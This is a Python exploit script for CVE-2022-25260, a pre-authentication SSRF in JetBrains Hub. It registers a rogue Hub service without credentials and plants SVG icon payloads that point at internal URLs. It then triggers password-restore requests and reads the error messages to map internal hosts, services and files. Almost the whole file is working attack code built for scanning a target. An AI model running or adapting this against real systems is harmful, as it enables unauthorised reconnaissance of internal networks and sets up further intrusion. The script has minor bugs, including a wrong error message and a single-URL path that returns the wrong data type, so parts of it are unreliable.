import sys
import argparse
import requests
import uuid
import json
from base64 import b64encode

class Exploit():

    def __init__(self, args):
        self.hub_url = args.hub_url
        self.email = args.email
        self.internal_urls_file = args.internal_urls_file
        self.internal_url = args.internal_url

    def _load_urls(self):
        urls = None
        try:
            with open(self.internal_urls_file, "r") as urls_file:
                urls = urls_file.readlines()
        except IOError:
            print("[ERROR] - failed to write results into output file.")
        return urls

    def _prepare_payloads(self):
        is_single = self.internal_url is not None
        if is_single:
            return [svg_base.format(self.internal_url)]

        urls = self._load_urls()
        if urls is None or len(urls) == 0:
            return None

        payloads = list()

        for url in urls:
            url = url.strip()
            encoded_payload = f"data:image/svg+xml;base64,{b64encode(svg_base.format(url.strip()).encode('ascii')).decode('ascii')}"
            payloads.append(dict(url=url, encoded_payload=encoded_payload))
        
        return payloads


#TODO: problem here
    def _get_client_token(self, credentials):
        basic_credentials = b64encode(f"{credentials['service_id']}:{credentials['service_secret']}".encode("ascii")).decode("ascii")
        try:
            response = requests.post(
                f"{self.hub_url}/hub/api/rest/oauth2/token",
                data=dict(
                    grant_type="client_credentials",
                    scope=f"0-0-0-0-0 {credentials['service_key']}"),
                headers={"Authorization": f"Basic {basic_credentials}"})
            if response.status_code != 200:
                print(f"[ERROR] - can't get an access token, unexpected HTTP status code '{response.status_code}'.")
                return None
        except Exception:
            print("[ERROR] - can't get an access token due to exception.")
            return None

        return json.loads(response.content)["access_token"]
            

    def _create_hub_service(self):
        service_id = str(uuid.uuid4())
        service_response = requests.post(
            f"{self.hub_url}/hub/api/rest/services",
            params=dict(fields="id,key,secret"),
            json=dict(name=str(service_id), homeUrl=f"http://{service_id}.com", id=service_id,))

        if service_response.status_code != 200:
            print(f"[ERROR] - can't create a service, it seems like the Hub instance has been patched.")
            sys.exit(-1)

        service_json = json.loads(service_response.content)

        service_id = service_json.get("id")
        service_secret = service_json.get("secret")
        service_key = service_json.get("key")

        return dict(
            service_id=service_id,
            service_secret=service_secret,
            service_key=service_key)

    def _update_hub_service(self, service_id: str, payload: str, service_token: str):
        service_response = requests.post(
            f"{self.hub_url}/hub/api/rest/services/{service_id}",
            headers={"Authorization": f"Bearer {service_token}"} if service_token is not None else None,
            params=dict(fields="id"),
            json=dict(iconUrl=payload))
        
        if service_response.status_code != 200:
            print(f"[ERROR] - can't update a service, unexpected HTTP status code '{service_response.status_code}'.")
            sys.exit(-1)

    def _trigger_password_restore(self, service_id: str, error_expected: bool):
        restore_response = requests.post(
            f"{self.hub_url}/hub/api/rest/oauth2/interactive/restore",
            params=dict(client_id=service_id),
            data=self.email)

        if error_expected and restore_response.status_code == 200:
            print("something went wrong")
            return

        if restore_response.status_code != 400: return

        error_details = json.loads(restore_response.content)

        return error_details


    def run(self):
        payloads = self._prepare_payloads()

        if payloads is None or len(payloads) == 0:
            print("[ERROR] - provide URLs for scanning.")
            sys.exit(-1)
    
        print(f"[INFO] - staring scanning for {len(payloads)} urls.")
        print("[INFO] - trying to create Hub service.")

        service_credentials = self._create_hub_service()

        if service_credentials is None or \
           service_credentials["service_id"] is None or \
           service_credentials["service_key"] is None or \
           service_credentials["service_secret"] is None :
            print("[ERROR] - can't  create hub service.")
            sys.exit(-1)

        print(f"[INFO] - Hub service create, serviceId: '{service_credentials['service_id']}'.")

        service_token = self._get_client_token(service_credentials)

        if service_token is None:
            print("[ERROR] - can't get service access token.")
            sys.exit(-1)

        for payload in payloads:
            print(f"[INFO] - trying to request: '{payload['url']}'.")

            self._update_hub_service(service_credentials['service_id'], payload['encoded_payload'], service_token)

            restore_error = self._trigger_password_restore(service_credentials['service_id'], True)
            
            restore_error_type = restore_error.get('error')
            restore_error_message = restore_error.get('error_description').replace('null\nEnclosed Exception:\n', '')

            if restore_error_type != expected_error:
                print(f"[ERROR] - unexpected error type '{restore_error_type}' recevied.")
                continue

            matched_errors = [error_message for error_message in errors_description_map.keys() if error_message in restore_error_message]

            if len(matched_errors) > 0:
                print(f"[INFO] - OK. {errors_description_map[matched_errors[0]].format(payload['url'], restore_error_message)}")
            else:
                print(f"[INFO] - UNKNOWN result for '{payload['url']}', can't map error message: '{restore_error_message}'.")

        print("[INFO] - scan finished.")


parser = argparse.ArgumentParser()
parser.add_argument("-hub_url", help="Target Hub instance", required=True)
parser.add_argument("-email", help="Email address of any user in the system", required=True)
parser.add_argument("-internal_urls_file", help="Path to internal service URLs file")
parser.add_argument("-internal_url", help="Internal service URL")

svg_base = """<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.0//EN"
"http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="450" height="500" viewBox="0 0 450 500">
    <use xlink:href="{}#id-fragment" />
</svg>
"""

errors_description_map = {
    "Connection refused": "Host '{0}' is DOWN.",
    "Unexpected end of file from server": "Host '{0}' is running non-HTTP service [FOUND]. Message: '{1}'.",
    "must be terminated by the matching end-tag": "Host '{0}' is running (presumably )HTTP service [FOUND]. Message: '{1}'.",
    "Server returned HTTP response code": "Host '{0}' is running HTTP service [FOUND]. Message: '{1}'.",
    "Content is not allowed in prolog": "Host '{0}' is running or File exists, response received. Message: '{1}'.",
    "No such file or directory": "File '{0}' doesn't exist.",
    "associated with an element type": "Host '{0}' is running HTTP service (XML-like response) [FOUND]. Message: '{1}'.",
    "Premature end of file": "Host '{0}' is running HTTP service (presumably) [FOUND]. Message: '{1}'.",
    "The markup in the document preceding the root element must be well-formed": "Host '{0}' is running HTTP service (presumably) [FOUND]. Message: '{1}'."
}

expected_error = 'notification_smtp_send_failed'

patch_error = "The security settings do not allow any external resources"

if __name__ == '__main__':
    print("|--------------------------------------------------------------------|")
    print("|       CVE-2022-25260 JetBrains Hub pre-auth semi-blind SSRF        |")
    print("|           developed by Yurii Sanin (Twitter: @SaninYurii)          |")
    print("|--------------------------------------------------------------------|")
    args = parser.parse_args()
    exploit = Exploit(args)
    exploit.run()